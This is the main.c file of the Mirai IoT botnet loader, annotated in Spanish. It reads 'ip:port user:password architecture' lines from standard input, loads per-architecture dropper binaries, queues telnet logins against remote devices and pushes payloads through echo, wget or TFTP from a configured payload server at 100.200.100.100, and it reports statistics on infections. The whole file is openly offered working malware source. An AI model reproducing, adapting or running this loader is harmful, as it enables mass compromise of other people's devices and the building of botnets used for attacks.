/**************************************************************************
 * Archivo: main.c
 * 
 * Descripción: Punto de entrada principal del cargador de Mirai.
 * Este módulo implementa la lógica principal del cargador, incluyendo:
 * - Inicialización del servidor y binarios
 * - Procesamiento de entradas de credenciales telnet
 * - Monitoreo de estadísticas en tiempo real
 * - Gestión de conexiones múltiples
 * 
 * El programa lee credenciales de entrada estándar y las procesa
 * para intentar infectar dispositivos remotos mediante telnet.
 **************************************************************************/

/***************************************************************************
 * Inclusión de cabeceras estándar
 ***************************************************************************/
#include <stdio.h>    /* Entrada/salida estándar */
#include <stdlib.h>   /* Funciones de utilidad general */
#include <unistd.h>   /* Funciones POSIX */
#include <string.h>   /* Manipulación de cadenas */
#include <pthread.h>  /* Soporte para hilos */
#include <sys/socket.h> /* API de sockets */
#include <errno.h>    /* Códigos de error */

/***************************************************************************
 * Inclusión de cabeceras del proyecto
 ***************************************************************************/
#include "headers/includes.h"     /* Definiciones comunes */
#include "headers/server.h"       /* Funcionalidad del servidor */
#include "headers/telnet_info.h"  /* Gestión de sesiones telnet */
#include "headers/binary.h"       /* Manejo de binarios */
#include "headers/util.h"         /* Funciones de utilidad */

/* Declaración anticipada del hilo de estadísticas */
static void *stats_thread(void *);

/* Variables globales */
static struct server *srv;        /* Instancia principal del servidor */
char *id_tag = "telnet";         /* Identificador para los binarios */

/**
 * Función principal del programa
 * 
 * Esta función inicializa el servidor, configura los binarios y procesa
 * las credenciales de entrada para intentar infectar dispositivos.
 * 
 * @param argc  Número de argumentos de línea de comandos
 * @param args  Array de argumentos de línea de comandos
 * @return      0 en caso de éxito, 1 en caso de error
 */
int main(int argc, char **args)
{
    /* Declaración de variables locales */
    pthread_t stats_thrd;          /* Identificador del hilo de estadísticas */
    uint8_t addrs_len;            /* Número de direcciones IP a vincular */
    ipv4_t *addrs;               /* Array de direcciones IPv4 */
    uint32_t total = 0;          /* Contador total de intentos de conexión */
    struct telnet_info info;     /* Estructura para información de conexión telnet */

    /* 
     * Configuración de direcciones IP según el modo de compilación
     * En modo DEBUG: Se vincula a todas las interfaces (0.0.0.0)
     * En modo normal: Se vincula a direcciones IP específicas
     */
#ifdef DEBUG
    addrs_len = 1;
    addrs = calloc(4, sizeof (ipv4_t));
    addrs[0] = inet_addr("0.0.0.0");  /* Vincula a todas las interfaces */
#else
    addrs_len = 2;
    addrs = calloc(addrs_len, sizeof (ipv4_t));

    addrs[0] = inet_addr("192.168.0.1");  /* Primera dirección de vinculación */
    addrs[1] = inet_addr("192.168.1.1");  /* Segunda dirección de vinculación */
#endif

    /* Procesa argumentos de línea de comandos si existen */
    if (argc == 2)
    {
        id_tag = args[1];  /* Establece el identificador personalizado */
    }

    /* 
     * Inicializa los binarios del dropper
     * Carga los archivos binarios específicos para cada arquitectura
     */
    if (!binary_init())
    {
        printf("Error: No se pudieron cargar los binarios bins/dlr.*\n");
        return 1;
    }

    /* 
     * Creación e inicialización del servidor
     * Parámetros:
     * - Número de núcleos del sistema para hilos
     * - Número de direcciones IP a vincular
     * - Array de direcciones IP
     * - Tamaño máximo del buffer (64KB)
     * - Dirección IP del servidor wget
     * - Puerto del servidor wget
     * - Dirección IP del servidor TFTP
     */
    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, 
                            "100.200.100.100", 80, "100.200.100.100")) == NULL)
    {
        printf("Error: Fallo en la inicialización del servidor\n");
        return 1;
    }

    /* Inicia el hilo de monitoreo de estadísticas */
    pthread_create(&stats_thrd, NULL, stats_thread, NULL);

    /* 
     * Bucle principal de procesamiento
     * Lee líneas de stdin con el formato: ip:puerto usuario:contraseña arquitectura
     * Procesa cada línea para intentar una conexión telnet
     */
    while (TRUE)
    {
        char strbuf[1024];  /* Buffer para almacenar la línea de entrada */

        /* Lee una línea de entrada estándar */
        if (fgets(strbuf, sizeof (strbuf), stdin) == NULL)
            break;  /* Sale si encuentra EOF o error */

        /* Elimina espacios en blanco al inicio y final */
        util_trim(strbuf);

        /* Ignora líneas vacías */
        if (strlen(strbuf) == 0)
        {
            usleep(10000);  /* Espera 10ms para evitar consumo excesivo de CPU */
            continue;
        }

        /* Inicializa la estructura de información telnet */
        memset(&info, 0, sizeof(struct telnet_info));
        
        /* Intenta parsear la información de la línea */
        if (telnet_info_parse(strbuf, &info) == NULL)
            printf("Error al parsear información telnet: \"%s\" Formato -> ip:puerto usuario:contraseña arquitectura\n", strbuf);
        else
        {
            /* Verifica que el servidor esté inicializado */
            if (srv == NULL)
                printf("Error: servidor no inicializado\n");

            /* Encola el intento de conexión telnet */
            server_queue_telnet(srv, &info);
            
            /* Pausa cada 1000 intentos para control de tasa */
            if (total++ % 1000 == 0)
                sleep(1);  /* Espera 1 segundo */
        }

        /* Incrementa atómicamente el contador de entradas procesadas */
        ATOMIC_INC(&srv->total_input);
    }

    printf("Se alcanzó el final de la entrada.\n");

    /* 
     * Espera a que todas las conexiones activas se cierren
     * antes de terminar el programa
     */
    while(ATOMIC_GET(&srv->curr_open) > 0)
        sleep(1);  /* Espera 1 segundo entre verificaciones */

    return 0;  /* Termina con éxito */
}

/**
 * Hilo de monitoreo de estadísticas
 * 
 * Este hilo se ejecuta en segundo plano y muestra periódicamente
 * estadísticas sobre el estado del servidor y las conexiones:
 * - Tiempo transcurrido
 * - Entradas procesadas
 * - Conexiones activas
 * - Inicios de sesión exitosos
 * - Binarios ejecutados
 * - Métodos de carga utilizados (echo, wget, tftp)
 * 
 * @param arg  Puntero a argumentos (no utilizado)
 * @return     NULL (el hilo se ejecuta indefinidamente)
 */
static void *stats_thread(void *arg)
{
    uint32_t seconds = 0;  /* Contador de segundos transcurridos */

    /* Bucle infinito de monitoreo */
    while (TRUE)
    {
#ifndef DEBUG
        /* 
         * Imprime estadísticas en modo no-debug:
         * - Tiempo transcurrido en segundos
         * - Total de entradas procesadas
         * - Conexiones actualmente abiertas
         * - Total de logins exitosos
         * - Total de ejecuciones exitosas
         * - Desglose por método de carga (echo, wget, tftp)
         */
        printf("%ds\tProcesadas: %d\tConexiones: %d\tLogins: %d\tEjecutados: %d\tEchoes:%d Wgets: %d, TFTPs: %d\n",
               seconds++,
               ATOMIC_GET(&srv->total_input),     /* Total de entradas procesadas */
               ATOMIC_GET(&srv->curr_open),       /* Conexiones actuales */
               ATOMIC_GET(&srv->total_logins),    /* Logins exitosos */
               ATOMIC_GET(&srv->total_successes), /* Ejecuciones exitosas */
               ATOMIC_GET(&srv->total_echoes),    /* Cargas via echo */
               ATOMIC_GET(&srv->total_wgets),     /* Cargas via wget */
               ATOMIC_GET(&srv->total_tftps));    /* Cargas via tftp */
#endif
        fflush(stdout);     /* Fuerza la escritura del buffer de salida */
        sleep(1);          /* Espera 1 segundo antes de la siguiente actualización */
    }
}
